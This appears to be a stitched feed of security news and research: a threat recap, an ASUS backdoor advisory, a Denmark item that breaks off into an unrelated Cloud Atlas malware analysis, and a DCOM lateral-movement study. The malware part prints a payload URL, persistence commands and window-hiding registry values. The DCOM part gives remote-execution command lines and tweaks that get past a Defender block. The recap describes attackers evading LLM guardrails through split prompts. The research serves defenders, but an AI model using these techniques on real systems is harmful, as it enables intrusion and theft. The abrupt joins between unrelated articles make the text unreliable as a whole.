cities, seizing vehicles, weapons, cash, computers, a polygraph machine, and forged IDs.The network operated multiple call centers employing around 100 people and targeted more than 400 known victims. Scammers impersonated bank employees and police, claimed accounts were compromised, and coerced victims into transferring funds to “safe” accounts. Others used remote access software to steal credentials or collect cash in person. Further seizures this week targeted the . According to the DoJ, the proceeds stemmed largely from ransomware operations and account takeover attacks, routed through a global network of money mules.The takedown was led by the FBI with support from German and Finnish authorities and Michigan State Police, with investigators confiscating multiple domains, mobile applications, backend servers, and customer databases containing transaction records. Prosecutors have also unsealed an indictment against alleged operator Mykhalio Petrovich Chudnovets and are charging him with money laundering conspiracy. While no arrests have been made, Chudnovets faces up to 20 years in prison. Authorities say seized records may support further identifications and follow-on enforcement actions.The Bad | North Korean Hackers Drive Record $2B Crypto Theft Surge in 2025 of the $3.4 billion+ stolen worldwide between January and early December. A new report delves into the 51% year-over-year increase, which marks the most severe year on record for DPRK-linked crypto crime while accounting for roughly 76% of all service compromises. Cumulatively, North Korean actors are now estimated to have stolen at least $6.75 billion in cryptocurrency.A single incident, attributed to the TraderTraitor cluster, dominated the year: the February breach of Bybit that resulted in losses of approximately $1.5 billion. Beyond Bybit, DPRK-linked actors are also suspected in the theft of $36 million from South Korea’s most popular cryptocurrency exchange, Upbit.These operations roll up into what is widely referred to as the Lazarus Group, a long-running threat actor tied to Pyongyang’s Reconnaissance General Bureau (RBG), which has historically blended large-scale crypto heists with espionage campaigns such as Contagious Interview, a campaign using fake recruitment-themed lures to deliver malware and harvest job applicant’s data.The growing scale of DPRK-linked crypto theft shows the profitability of high-value, state-backed operations, also incentivizing other actors to adopt similar tactics, including advanced laundering schemes, affiliate-based attacks, and cross-border exploitation.For the broader ecosystem, North Korean threat operations continue to both normalize large-scale crypto heists and accelerate the professionalization of illicit networks, complicating attribution and straining global law enforcement resources.The Ugly | Threat Actors Upscaling Abilities with Widespread Adoption of LLMsRansomware operations are undergoing a rapid, dangerous transformation not through novel “super-hacks” but via the industrialized efficiency of Large Language Models (LLMs). A new report by SentinelLABS assesses that . The researchers say that threat actors are now automating reconnaissance, generating localized phishing lures, and triaging massive datasets across language barriers with unprecedented speed and accuracy with the help of LLMs. Ransomware-as-a-Service operators are already claiming to offer AI-assisted tools to affiliates to increase attack productivity.SentinelLABS says attackers are successfully evading commercial guardrails through “prompt smuggling”, a process by which . The outputs are then stitched together offline to build working attack tools.The researchers predict that top-tier actors will go further, likely migrating to self-hosted, open-source models like Ollama to entirely avoid provider guardrails. This evolution would allow criminals to operate without telemetry or censorship, effectively weaponizing unrestricted AI. . Anthropic has reported on tools like Claude Code being used to automate entire extortion chains, from technical reconnaissance to calculating optimal ransom demands. In other instances, malware such as QUIETVAULT has been seen hijacking a victim’s own locally installed LLMs to intelligently hunt for crypto-wallets and sensitive files. While the report adds to the general industry concern around the use of AI by threat actors, it also debunks one of the wider myths in common circulation. The risk from today’s LLMs, the researchers say, isn’t superintelligent malware or novel attack vectors, it’s the more mundane , factors that increasingly complicate attribution and challenge defenders to adapt to a significantly higher-volume threat landscape.]]></content:encoded></item><item><title>CISA warns ASUS Live Update backdoor is still exploitable, seven years on</title><link>https://www.malwarebytes.com/blog/news/2025/12/cisa-warns-asus-live-update-backdoor-is-still-exploitable-seven-years-on</link><author></author><category>threatintel</category><pubDate>Fri, 19 Dec 2025 13:56:36 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[The KEV catalog lists vulnerabilities that are known to be exploited in the wild and sets patch deadlines for Federal Civilian Executive Branch (FCEB) agencies. When CISA adds an issue to this list, it’s a strong signal that exploitation is real, ongoing, and urgent.The ASUS Live Update Embedded Malicious Code vulnerability, tracked as CVE-2025-59374 (with a CVSS score of 9.3), affects Live Update, a utility commonly used to deliver firmware and software updates to ASUS devices.This isn’t the first time ASUS Live Update has been linked to serious security incidents. In 2019, ASUS responded to media reports about attacks on the Live Update tool by advanced persistent threat (APT) groups, stating that:“A small number of devices have been implanted with malicious code through a sophisticated attack on our Live Update servers in an attempt to target a very small and specific user group.”Later investigations revealed that a sophisticated supply chain attack mounted in 2018, attributed to Chinese state-sponsored attackers, had inserted a backdoor into ASUS Live Update. The attack was particularly effective because that utility came preinstalled on most ASUS devices and was used to the automatically update BIOS, UEFI, drivers, and other components.CISA now notes that the affected devices could be abused to perform unintended actions if certain conditions are met. Originally, the attackers reportedly targeted only around 600 specific devices, based on hashed MAC addresses hardcoded in various versions of the tool. This was despite the fact that millions of users may have downloaded the backdoored utility.Support for the ASUS Live Update application has since been discontinued. The final intended version of ASUS Live Update was 3.6.15, but it will continue to provide software updates. This is likely why a CVE was assigned and why the vulnerability was added to the KEV catalog. There was no official “why now” statement from ASUS, MITRE, or CISA, but the timing aligns with a legacy, end-of-support product being reclassified as a vulnerability with confirmed active exploitation.What do ASUS users need to do?First of all, make sure you’re running a clean version of the utility. ASUS urges users to update to version  to address known security issues.Alternatively, you can download and install the latest version manually. ASUS’ own support article describes the only official way to get the current Live Update package:​Go to the ASUS Official Website (asus.com)Use the search box to find your exact model (e.g., UX580GD)Open the product page and click  → Select your operating system (e.g., Windows 10/11 64-bit).​In the  section, locate  and click This is as close as we could get you to a “direct” official download. The URL is different for every model and ASUS does not provide a central Live Update installer directory. While this makes it harder than it maybe should be, we do recommend using this official download. Given the history of supply chain abuse involving this tool, downloading it from third-party sources is a risk not worth taking.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Denmark blames Russia for destructive cyberattack on water utility</title><link>https://www.bleepingcomputer.com/news/security/denmark-blames-russia-for-destructive-cyberattack-on-water-utility/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 19 Dec 2025 12:28:48 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Danish intelligence officials blamed Russia for orchestrating cyberattacks against Denmark's critical infrastructure, as part of Moscow's hybrid attacks against Western nations.

Infections occur via phishing emails containing a malicious document that exploits an old vulnerability in the Microsoft Office Equation Editor process (CVE-2018-0802) to download and execute malicious code. In this report, we describe the infection chain and tools that the group used in the first half of 2025, with particular focus on previously undescribed implants.The starting point is typically a phishing email with a malicious DOC(X) attachment. When the document is opened, a malicious template is downloaded from a remote server. The document has the form of an RTF file containing an exploit for the formula editor, which downloads and executes an HTML Application (HTA) file.
FpayloMalicious template with the exploit loaded by Word when opening the documentWe were unable to obtain the actual RTF template with the exploit. We assume that after a successful infection of the victim, the link to this file becomes inaccessible. In the given example, the malicious RTF file containing the exploit was downloaded from the URL hxxps://securemodem[.]com?tzak.html_anacid.Template files, like HTA files, are located on servers controlled by the group, and their downloading is limited both in time and by the IP addresses of the victims. The malicious HTA file extracts and creates several VBS files on disk that are parts of the VBShower backdoor. VBShower then downloads and installs other backdoors: PowerShower, VBCloud, and CloudAtlas.Several implants remain the same, with insignificant changes in file names, and so on. You can find more details in our previous article on the following implants:In this research, we’ll focus on new and updated components.Compared to the previous version, the backdoor runs additional downloaded VB scripts in the current context, regardless of the size. A previous modification of this script checked the size of the payload, and if it exceeded 1 MB, instead of executing it in the current context, the backdoor wrote it to disk and used the  utility to launch it.The script collects information about running processes, including their creation time, caption, and command line. The collected information is encrypted and sent to the C2 server by the parent script (VBShower::Backdoor) via the  variable.The script is used to install the VBCloud implant. First, it downloads a ZIP archive from the hardcoded URL and unpacks it into the  directory. Then, it creates a scheduler task named “MicrosoftEdgeUpdateTask” to run the following command line:wscript.exe /B %Public%\Libraries\MicrosoftEdgeUpdate.vbs
It renames the unzipped file  to %Public%\Libraries\MicrosoftEdgeUpdate.vbs, iterates through the files in the  directory, and collects information about the filenames and sizes. The data, in the form of a buffer, is collected in the  variable. The malware gets information about the task by executing the following command line:cmd.exe /c schtasks /query /v /fo CSV /tn MicrosoftEdgeUpdateTask
The specified command line is executed, with the output redirected to the TMP file. Both the TMP file and the content of the  variable will be sent to the C2 server by the parent script (VBShower::Backdoor).Here is an example of the information present in the  variable:Libraries:
desktop.ini-175|
MicrosoftEdgeUpdate.vbs-2299|
RecordedTV.library-ms-999|
upgrade.mds-32840|
v.log-2299|
The file  is a launcher for VBCloud, which reads the encrypted body of the backdoor from the file , decrypts it, and executes it.VBShower::Payload (2) used to install VBCloudAlmost the same script is used to install the CloudAtlas backdoor on an infected system. The script only downloads and unpacks the ZIP archive to , and sends information about the contents of the directories "%LOCALAPPDATA%\vlc\plugins\access" and  as output.In this case, the file renaming operation is not applied, and there is no code for creating a scheduler task.Here is an example of information to be sent to the C2 server:vlc:
a.xml-969608|
b.xml-592960|
d.xml-2680200|
e.xml-185224||
access:
c.xml-5951488|
In fact, , , and  are the executable file and libraries, respectively, of VLC Media Player. The  file is a malicious library used in a DLL hijacking attack, where VLC acts as a loader, and the  file is an encrypted body of the CloudAtlas backdoor, read from disk by the malicious library, decrypted, and executed.VBShower::Payload (2) used to install CloudAtlasThis script is the next component for installing CloudAtlas. It is downloaded by VBShower from the C2 server as a separate file and executed after the VBShower::Payload (2) script. The script renames the XML files unpacked by VBShower::Payload (2) from the archive to the corresponding executables and libraries, and also renames the file containing the encrypted backdoor body.These files are copied by VBShower::Payload (3) to the following paths:%LOCALAPPDATA%\vlc\vlc.exe%LOCALAPPDATA%\vlc\chambranle%LOCALAPPDATA%\vlc\plugins\access\libvlc_plugin.dll%LOCALAPPDATA%\vlc\libvlccore.dll%LOCALAPPDATA%\vlc\libvlc.dllAdditionally, VBShower::Payload (3) creates a scheduler task to execute the command line: "%LOCALAPPDATA%\vlc\vlc.exe". The script then iterates through the files in the  and "%LOCALAPPDATA%\vlc\plugins\access" directories, collecting information about filenames and sizes. The data, in the form of a buffer, is collected in the  variable. The script also retrieves information about the task by executing the following command line, with the output redirected to a TMP file:cmd.exe /c schtasks /query /v /fo CSV /tn MicrosoftVLCTaskMachine
Both the TMP file and the content of the  variable will be sent to the C2 server by the parent script (VBShower::Backdoor).VBShower::Payload (3) used to install CloudAtlasThis script is used to check access to various cloud services and executed before installing VBCloud or CloudAtlas. It consistently accesses the URLs of cloud services, and the received HTTP responses are saved to the  variable for subsequent sending to the C2 server. A truncated example of the information sent to the C2 server:GET-https://webdav.yandex.ru|

<!DOCTYPE html><html lang="ru" dir="ltr" class="desktop"><head><base href="...This is a small script for checking the accessibility of PowerShower’s C2 from an infected system.This script is used to install PowerShower, another backdoor known to be employed by Cloud Atlas. The script does so by performing the following steps in sequence:Creates registry keys to make the console window appear off-screen, effectively hiding it:"HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe"::"WindowPosition"::5122

Then, renames the file  to .Collects information about file names and sizes in the path . Gets information about the task by executing the following command line, with the output redirected to a TMP file:cmd.exe /c schtasks /query /v /fo LIST /tn MicrosoftAdobeUpdateTaskMachineVBShower::Payload (8) used to install PowerShowerThe decrypted PowerShell script is disguised as one of the standard modules, but at the end of the script, there is a command to launch the PowerShell interpreter with another script encoded in Base64.Content of AdobeMon.ps1 (PowerShower)This is a small script for collecting information about the system proxy settings.On an infected system, VBCloud is represented by two files: a VB script (VBCloud::Launcher) and an encrypted main body (VBCloud::Backdoor). In the described case, the launcher is located in the file , and the payload — in .The launcher script reads the contents of the  file, decodes characters delimited with “%H”, uses the RC4 stream encryption algorithm with a key built into the script to decrypt it, and transfers control to the decrypted content. It is worth noting that the implementation of RC4 uses PRGA (pseudo-random generation algorithm), which is quite rare, since most malware implementations of this algorithm skip this step.VBCloud::Payload (FileGrabber)Unlike VBShower, which uses a global variable to save its output or a temporary file to be sent to the C2 server, each VBCloud payload communicates with the C2 server independently. One of the most commonly used payloads for the VBCloud backdoor is FileGrabber. The script exfiltrates files and documents from the target system as described before.The FileGrabber payload has the following limitations when scanning for files:It ignores the following paths:
The file size for archiving must be between 1,000 and 3,000,000 bytes.The file’s last modification date must be less than 30 days before the start of the scan.Files containing the following strings in their names are ignored:
“SiteSecurityServiceState.txt”Part of VBCloud::Payload (FileGrabber)As mentioned above, PowerShower is installed via one of the VBShower payloads. This script launches the PowerShell interpreter with another script encoded in Base64. Running in an infinite loop, it attempts to access the C2 server to retrieve an additional payload, which is a PowerShell script twice encoded with Base64. This payload is executed in the context of the backdoor, and the execution result is sent to the C2 server via an HTTP POST request.Decoded PowerShower scriptIn previous versions of PowerShower, the payload created a  temporary file to save its output, which was sent to the C2 server by the main body of the backdoor. No intermediate files are created anymore, and the result of execution is returned to the backdoor by a normal call to the  operator.This script is used for grabbing files with metadata from a network share.As described above, the CloudAtlas backdoor is installed via VBShower from a downloaded archive delivered through a DLL hijacking attack. The legitimate VLC application acts as a loader, accompanied by a malicious library that reads the encrypted payload from the file and transfers control to it. The malicious DLL is located at "%LOCALAPPDATA%\vlc\plugins\access", while the file with the encrypted payload is located at .When the malicious DLL gains control, it first extracts another DLL from itself, places it in the memory of the current process, and transfers control to it. The unpacked DLL uses a byte-by-byte XOR operation to decrypt the block with the loader configuration. The encrypted config immediately follows the key. The config specifies the name of the event that is created to prevent a duplicate payload launch. The config also contains the name of the file where the encrypted payload is located —  in this case — and the decryption key itself.Encrypted and decrypted loader configurationThe library reads the contents of the  file with the payload, uses the key from the decrypted config and the IV located at the very end of the  file to decrypt it with AES-256-CBC. The decrypted file is another DLL with its size and SHA-1 hash embedded at the end, added to verify that the DLL is decrypted correctly. The DLL decrypted from  is the main body of the CloudAtlas backdoor, and control is transferred to it via one of the exported functions, specifically the one with ordinal 2.Main routine that processes the payload fileWhen the main body of the backdoor gains control, the first thing it does is decrypt its own configuration. Decryption is done in a similar way, using AES-256-CBC. The key for AES-256 is located before the configuration, and the IV is located right after it. The most useful information in the configuration file includes the URL of the cloud service, paths to directories for receiving payloads and unloading results, and credentials for the cloud service.Encrypted and decrypted CloudAtlas backdoor configImmediately after decrypting the configuration, the backdoor starts interacting with the C2 server, which is a cloud service, via WebDAV. First, the backdoor uses the MKCOL HTTP method to create two directories: one ("/guessed/intershop/Euskalduns/") will regularly receive a beacon in the form of an encrypted file containing information about the system, time, user name, current command line, and volume information. The other directory ("/cancrenate/speciesists/") is used to retrieve payloads. The beacon file and payload files are AES-256-CBC encrypted with the key that was used for backdoor configuration decryption.HTTP requests of the CloudAtlas backdoorThe backdoor uses the HTTP PROPFIND method to retrieve the list of files. Each of these files will be subsequently downloaded, deleted from the cloud service, decrypted, and executed.HTTP requests from the CloudAtlas backdoorThe payload consists of data with a binary block containing a command number and arguments at the beginning, followed by an executable plugin in the form of a DLL. The structure of the arguments depends on the type of command. After the plugin is loaded into memory and configured, the backdoor calls the exported function with ordinal 1, passing several arguments: a pointer to the backdoor function that implements sending files to the cloud service, a pointer to the decrypted backdoor configuration, and a pointer to the binary block with the command and arguments from the beginning of the payload.Plugin setup and execution routineBefore calling the plugin function, the backdoor saves the path to the current directory and restores it after the function is executed. Additionally, after execution, the plugin is removed from memory.CloudAtlas::Plugin (FileGrabber)FileGrabber is the most commonly used plugin. As the name suggests, it is designed to steal files from an infected system. Depending on the command block transmitted, it is capable of:Stealing files from all local disksStealing files from the specified removable mediaStealing files from specified foldersUsing the selected username and password from the command block to mount network resources and then steal files from themFor each detected file, a series of rules are generated based on the conditions passed within the command block, including:Checking for minimum and maximum file sizeChecking the file’s last modification timeChecking the file path for pattern exclusions. If a string pattern is found in the full path to a file, the file is ignoredChecking the file name or extension against a list of patternsIf all conditions match, the file is sent to the C2 server, along with its metadata, including attributes, creation time, last access time, last modification time, size, full path to the file, and SHA-1 of the file contents. Additionally, if a special flag is set in one of the rule fields, the file will be deleted after a copy is sent to the C2 server. There is also a limit on the total amount of data sent, and if this limit is exceeded, scanning of the resource stops.Generating data for sending to C2This is a general-purpose plugin, which parses the transferred block, splits it into commands, and executes them. Each command has its own ID, ranging from 0 to 6. The list of commands is presented below.Creates, sets and closes named events.Deletes the selected list of files.Drops a file on disk with content and a path selected in the command block arguments.Capable of performing several operations together or independently, including:
Dropping several files on disk with content and paths selected in the command block argumentsDropping and executing a file at a specified path with selected parameters. This operation supports three types of launch:Using the WinExec functionUsing the ShellExecuteW functionUsing the CreateProcessWithLogonW function, which requires that the user’s credentials be passed within the command block to launch the process on their behalf Uses the StdRegProv COM interface to perform registry manipulations, supporting key creation, value deletion, and value setting (both DWORD and string values). Calls the ExitProcess function. Uses the credentials passed within the command block to connect a network resource, drops a file to the remote resource under the name specified within the command block, creates and runs a VB script on the local system to execute the dropped file on the remote system. The VB script is created at . The path to launch the file dropped on the remote system is passed to the launched VB script as an argument.Content of the dropped VBSCloudAtlas::Plugin (PasswordStealer)This plugin is used to steal cookies and credentials from browsers. This is an extended version of the Common Plugin, which is used for more specific purposes. It can also drop, launch, and delete files, but its primary function is to drop files belonging to the “Chrome App-Bound Encryption Decryption” open-source project onto the disk, and run the utility to steal cookies and passwords from Chromium-based browsers. After launching the utility, several files ( and ) containing the extracted browser data are created on disk. The plugin then reads JSON data from the selected files, parses the data, and sends the extracted information to the C2 server.Part of the function for parsing JSON and sending the extracted data to C2CloudAtlas::Plugin (InfoCollector)This plugin is used to collect information about the infected system. The list of commands is presented below. Collects the computer’s NetBIOS name and domain information. Gets a list of processes, including full paths to executable files of processes, and a list of modules (DLLs) loaded into each process. Collects information about installed products. Collects device information. Collects information about logical drives. Executes the command with input/output redirection, and sends the output to the C2 server. If the command line for execution is not specified, it sequentially launches the following utilities and sends their output to the C2 server:net group "Exchange servers" /domain
Ipconfig
arp -aAs mentioned in one of our previous reports, Cloud Atlas uses a custom Python script named  to extract saved credentials from browsers on infected systems. If the Python interpreter is not present on the victim’s machine, the group delivers an archive that includes both the script and a bundled Python interpreter to ensure execution.During one of the latest incidents we investigated, we once again observed traces of this tool in action, specifically the presence of the file "C:\ProgramData\py\pytest.dll".The  library is called from within  and used to extract credentials from Yandex Browser. The data is then saved locally to a file named .According to our telemetry, the identified targets of the malicious activities described here are located in Russia and Belarus, with observed activity dating back to the beginning of 2025. The industries being targeted are diverse, encompassing organizations in the telecommunications sector, construction, government entities, and plants.For more than ten years, the group has carried on its activities and expanded its arsenal. Now the attackers have four implants at their disposal (PowerShower, VBShower, VBCloud, CloudAtlas), each of them a full-fledged backdoor. Most of the functionality in the backdoors is duplicated, but some payloads provide various exclusive capabilities. The use of cloud services to manage backdoors is a distinctive feature of the group, and it has proven itself in various attacks.

One common technique for remote command execution has been the use of DCOM objects.Over the years, many different DCOM objects have been discovered. Some rely on native Windows components, others depend on third-party software such as Microsoft Office, and some are undocumented objects found through reverse engineering. While certain objects still work, others no longer function in newer versions of Windows.This research presents a previously undescribed DCOM object that can be used for both command execution and potential persistence. This new technique abuses older initial access and persistence methods through Control Panel items.First, we will discuss COM technology. After that, we will review the current state of the Impacket dcomexec script, focusing on objects that still function, and discuss potential fixes and improvements, then move on to techniques for enumerating objects on the system. Next, we will examine Control Panel items, how adversaries have used them for initial access and persistence, and how these items can be leveraged through a DCOM object to achieve command execution.COM stands for Component Object Model, a Microsoft technology that defines a binary standard for interoperability. It enables the creation of reusable software components that can interact at runtime without the need to compile COM libraries directly into an application.These software components operate in a client–server model. A COM object exposes its functionality through one or more interfaces. An interface is essentially a collection of related member functions (methods).COM also enables communication between processes running on the same machine by using local RPC (Remote Procedure Call) to handle cross-process communication.To ensure a better understanding of its structure and functionality, let’s revise COM-related terminology.A COM interface defines the functionality that a COM object exposes. Each COM interface is identified by a unique GUID known as the IID (Interface ID). All COM interfaces can be found in the Windows Registry under HKEY_CLASSES_ROOT\Interface, where they are organized by GUID.A COM class is the actual implementation of one or more COM interfaces. Like COM interfaces, classes are identified by unique GUIDs, but in this case the GUID is called the CLSID (Class ID). This GUID is used to locate the COM server and activate the corresponding COM class.All COM classes must be registered in the registry under HKEY_CLASSES_ROOT\CLSID, where each class’s GUID is stored. Under each GUID, you may find multiple subkeys that serve different purposes, such as:InprocServer32/LocalServer32: Specifies the system path of the COM server where the class is defined. InprocServer32 is used for in-process servers (DLLs), while LocalServer32 is used for out-of-process servers (EXEs). We’ll describe this in more detail later.ProgID: A human-readable name assigned to the COM class.TypeLib: A binary description of the COM class (essentially documentation for the class).AppID: Used to describe security configuration for the class.A COM is the module where a COM class is defined. The server can be implemented as an EXE, in which case it is called an out-of-process server, or as a DLL, in which case it is called an in-process server. Each COM server has a unique file path or location in the system. Information about COM servers is stored in the Windows Registry. The COM runtime uses the registry to locate the server and perform further actions. Registry entries for COM servers are located under the HKEY_CLASSES_ROOT root key for both 32- and 64-bit servers.Component Object Model implementationIn the case of an in-process server, the server is implemented as a DLL. The client loads this DLL into its own address space and directly executes functions exposed by the COM object. This approach is efficient since both client and server run within the same process.Here, the server is implemented and compiled as an executable (EXE). Since the client cannot load an EXE into its address space, the server runs in its own process, separate from the client. Communication between the two processes is handled via ALPC (Advanced Local Procedure Call) ports, which serve as the RPC transport layer for COM.Out-of-process COM serverDCOM is an extension of COM where the D stands for Distributed. It enables the client and server to reside on different machines. From the user’s perspective, there is no difference: DCOM provides an abstraction layer that makes both the client and the server appear as if they are on the same machine.Under the hood, however, COM uses TCP as the RPC transport layer to enable communication across machines.Distributed COM implementationCertain requirements must be met to extend a COM object into a DCOM object. The most important one for our research is the presence of the AppID subkey in the registry, located under the COM CLSID entry.The AppID value contains a GUID that maps to a corresponding key under HKEY_CLASSES_ROOT\AppID. Several subkeys may exist under this GUID. Two critical ones are:AccessPermission: controls access permissions.LaunchPermission: controls activation permissions.These registry settings grant remote clients permissions to activate and interact with DCOM objects.After attackers compromise a host, their next objective is often to compromise additional machines. This is what we call lateral movement. One common lateral movement technique is to achieve remote command execution on a target machine. There are many ways to do this, one of which involves abusing DCOM objects.In recent years, many DCOM objects have been discovered. This research focuses on the objects exposed by the Impacket script dcomexec.py that can be used for command execution. More specifically, three exposed objects are used: ShellWindows, ShellBrowserWindow and MMC20.
ShellWindows was one of the first DCOM objects to be identified. It represents a collection of open shell windows and is hosted by explorer.exe, meaning any COM client communicates with that process. In Impacket’s dcomexec.py, once an instance of this COM object is created on a remote machine, the script provides a semi-interactive shell. Each time a user enters a command, the function exposed by the COM object is called. The command output is redirected to a file, which the script retrieves via SMB and displays back to simulate a regular shell. Internally, the script runs this command when connecting:cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__17602 2>&1This sets the working directory to C:\ and redirects the output to the ADMIN$ share under the filename . After that, the script checks whether the file exists; if it does, execution is considered successful and the output appears as if in a shell. When running dcomexec.py against Windows 10 and 11 using the ShellWindows object, the script hangs after confirming SMB connection initialization and printing the SMB banner. As I mentioned in my personal blog post, it appears that this DCOM object no longer has permission to write to the ADMIN$ share. A simple fix is to redirect the output to a directory the DCOM object can write to, such as the Temp folder. The Temp folder can then be accessed under the same ADMIN$ share. A small change in the code resolves the issue. For example:OUTPUT_FILENAME = 'Temp\\__' + str(time.time())[:5]
The ShellBrowserWindow object behaves almost identically to ShellWindows and exhibits the same behavior on Windows 10. The same workaround that we used for ShellWindows applies in this case. However, on Windows 11, this object no longer works for command execution.
The MMC20.Application COM object is the automation interface for Microsoft Management Console (MMC). It exposes methods and properties that allow MMC snap-ins to be automated. This object has historically worked across all Windows versions. Starting with Windows Server 2025, however, attempting to use it triggers a Defender alert, and execution is blocked. As shown in earlier examples, the dcomexec.py script writes the command output to a file under ADMIN$, with a filename that begins with : OUTPUT_FILENAME = '__' + str(time.time())[:5]Defender appears to check for files written under ADMIN$ that start with , and when it detects one, it blocks the process and alerts the user. A quick fix is to simply remove the double underscores from the output filename. Another way to bypass this issue is to use the same workaround used for ShellWindows – redirecting the output to the Temp folder. The table below outlines the status of these objects across different Windows versions.The first step to identifying which DCOM objects could be used for lateral movement is to enumerate them. By enumerating, I don’t just mean listing the objects. Enumeration involves:Finding objects and filtering specifically for DCOM objects.Identifying their interfaces.Inspecting the exposed functions.Automating enumeration is difficult because most COM objects lack a type library (TypeLib). A TypeLib acts as documentation for an object: which interfaces it supports, which functions are exposed, and the definitions of those functions. Even when TypeLibs are available, manual inspection is often still required, as we will explain later.There are several approaches to enumerating COM objects depending on their use cases. Next, we’ll describe the methods I used while conducting this research, taking into account both automated and manual methods. Automation using PowerShellIn PowerShell, you can use .NET to create and interact with DCOM objects. Objects can be created using either their ProgID or CLSID, after which you can call their functions (as shown in the figure below).Shell.Application COM object function list in PowerShellUnder the hood, PowerShell checks whether the COM object has a TypeLib and implements the IDispatch interface. IDispatch enables late binding, which allows runtime dynamic object creation and function invocation. With these two conditions met, PowerShell can dynamically interact with COM objects at runtime. Our strategy looks like this: As you can see in the last box, we perform manual inspection to look for functions with names that could be of interest, such as Execute, Exec, Shell, etc. These names often indicate potential command execution capabilities. However, this approach has several limitations: TypeLib requirement: Not all COM objects have a TypeLib, so many objects cannot be enumerated this way.IDispatch requirement: Not all COM objects implement the IDispatch interface, which is required for PowerShell interaction.Interface control: When you instantiate an object in PowerShell, you cannot choose which interface the instance will be tied to. If a COM class implements multiple interfaces, PowerShell will automatically select the one marked as [default] in the TypeLib. This means that other non-default interfaces, which may contain additional relevant functionality, such as command execution, could be overlooked.As you might expect, C++ is one of the languages that natively supports COM clients. Using C++, you can create instances of COM objects and call their functions via header files that define the interfaces.However, with this approach, we are not necessarily interested in calling functions directly. Instead, the goal is to check whether a specific COM object supports certain interfaces. The reasoning is that many interfaces have been found to contain functions that can be abused for command execution or other purposes. This strategy primarily relies on an interface called IUnknown. All COM interfaces should inherit from this interface, and all COM classes should implement it.The IUnknown interface exposes three main functions. The most important is QueryInterface(), which is used to ask a COM object for a pointer to one of its interfaces.So, the strategy is to:Enumerate COM classes in the system by reading CLSIDs under the HKEY_CLASSES_ROOT\CLSID key.Check whether they support any known valuable interfaces. If they do, those classes may be leveraged for command execution or other useful functionality.This method has several advantages:No TypeLib dependency: Unlike PowerShell, this approach does not require the COM object to have a TypeLib.Use of IUnknown: In C++, you can use the QueryInterface function from the base IUnknown interface to check if a particular interface is supported by a COM class.No need for interface definitions: Even without knowing the exact interface structure, you can obtain a pointer to its virtual function table (vtable), typically cast as a void*. This is enough to confirm the existence of the interface and potentially inspect it further.The figure below illustrates this strategy: This approach is good in terms of automation because it eliminates the need for manual inspection. However, we are still only checking well-known interfaces commonly used for lateral movement, while potentially missing others. Manual inspection using open-source tools
As you can see, automation can be difficult since it requires several prerequisites and, in many cases, still ends with a manual inspection. An alternative approach is manual inspection using a tool called OleViewDotNet, developed by James Forshaw. This tool allows you to:List all COM classes in the system.Create instances of those classes.Check their supported interfaces.Apply various filters for easier analysis.Perform other inspection tasks.Open-source tool for inspecting COM interfacesOne of the most valuable features of this tool is its naming visibility. OleViewDotNet extracts the names of interfaces and classes (when available) from the Windows Registry and displays them, along with any associated type libraries. This makes manual inspection easier, since you can analyze the names of classes, interfaces, or type libraries and correlate them with potentially interesting functionality, for example, functions that could lead to command execution or persistence techniques.Control Panel items as attack surfacesControl Panel items allow users to view and adjust their computer settings. These items are implemented as DLLs that export the CPlApplet function and typically have the .cpl extension. Control Panel items can also be executables, but our research will focus on DLLs only.Attackers can abuse CPL files for initial access. When a user executes a malicious .cpl file (e.g., delivered via phishing), the system may be compromised – a technique mapped to MITRE ATT&CK T1218.002.Adversaries may also modify the extensions of malicious DLLs to .cpl and register them in the corresponding locations in the registry.Under HKEY_CURRENT_USER:
HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CplsUnder HKEY_LOCAL_MACHINE:
For 64-bit DLLs:
HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\CplsFor 32-bit DLLs:
HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Control Panel\CplsThese locations are important when Control Panel DLLs need to be available to the current logged-in user or to all users on the machine. However, the “Control Panel” subkey and its “Cpls” subkey under HKCU should be created manually, unlike the “Control Panel” and “Cpls” subkeys under HKLM, which are created automatically by the operating system.Once registered, the DLL (CPL file) will load every time the Control Panel is opened, enabling persistence on the victim’s system.It’s worth noting that even DLLs that do not comply with the CPL specification, do not export CPlApplet, or do not have the .cpl extension can still be executed via their DllEntryPoint function if they are registered under the registry keys listed above.There are multiple ways to execute Control Panel items:From cmd: control.exe [filename].cplBy double-clicking the .cpl file.Both methods use rundll32.exe under the hood:rundll32.exe shell32.dll,Control_RunDLL [filename].cplThis calls the Control_RunDLL function from shell32.dll, passing the CPL file as an argument. Everything inside the CPlApplet function will then be executed.However, if the CPL file has been registered in the registry as shown earlier, then every time the Control Panel is opened, the file is loaded into memory through the COM Surrogate process (dllhost.exe):COM Surrogate process loading the CPL fileWhat happened was that a Control Panel with a COM client used a COM object to load these CPL files. We will talk about this COM object in more detail later.The COM Surrogate process was designed to host COM server DLLs in a separate process rather than loading them directly into the client process’s address space. This isolation improves stability for the in-process server model. This hosting behavior can be configured for a COM object in the registry if you want a COM server DLL to run inside a separate process because, by default, it is loaded in the same process.While following the manual approach of enumerating COM/DCOM objects that could be useful for lateral movement, I came across a COM object called COpenControlPanel, which is exposed through shell32.dll and has the CLSID {06622D85-6856-4460-8DE1-A81921B41C4B}. This object exposes multiple interfaces, one of which is IOpenControlPanel with IID {D11AD862-66DE-4DF4-BF6C-1F5621996AF1}.IOpenControlPanel interface in the OleViewDotNet outputI immediately thought of its potential to compromise Control Panel items, so I wanted to check which functions were exposed by this interface. Unfortunately, neither the interface nor the COM class has a type library.COpenControlPanel interfaces without TypeLibNormally, checking the interface definition would require reverse engineering, so at first, it looked like we needed to take a different research path. However, it turned out that the IOpenControlPanel interface is documented on MSDN, and according to the documentation, it exposes several functions. One of them, called Open, allows a specified Control Panel item to be opened using its name as the first argument.Full type and function definitions are provided in the shobjidl_core.h Windows header file.Open function exposed by IOpenControlPanel interfaceIt’s worth noting that in newer versions of Windows (e.g., Windows Server 2025 and Windows 11), Microsoft has removed interface names from the registry, which means they can no longer be identified through OleViewDotNet.COpenControlPanel interfaces without namesReturning to the COpenControlPanel COM 